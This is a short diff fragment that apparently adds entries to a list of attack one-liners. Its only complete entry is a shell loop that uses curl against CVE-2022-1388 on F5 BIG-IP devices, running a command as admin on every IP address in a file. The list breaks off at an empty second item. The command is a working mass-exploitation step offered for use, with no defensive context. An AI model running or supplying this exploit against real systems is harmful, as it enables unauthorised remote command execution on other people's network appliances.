@@ -1,0 +1,4 @@
+
+1) Exploit F5 Big IP Using Curl (CVE-2022-1388)
+  cat ips.txt | while read ip; do curl -su admin -H "Content-Type: application/json" http://$ip/mgmt/tm/util/bash -d '{"command":"run","utilCmdArgs":"-c id"}';done
+ 2)
